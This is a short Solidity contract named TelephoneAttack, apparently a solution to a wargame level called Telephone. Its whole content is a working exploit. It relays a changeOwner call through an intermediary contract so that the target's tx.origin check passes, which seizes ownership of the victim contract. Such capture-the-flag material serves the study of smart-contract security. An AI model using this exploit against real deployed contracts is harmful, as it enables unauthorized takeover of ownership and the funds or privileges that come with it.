// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone public victimcontract;
    
    

    constructor(address _victimContractAddress) public {
        victimcontract = Telephone(_victimContractAddress);
    }

    function changeOwner(address _owner) public {
       victimcontract.changeOwner(_owner);
    }
}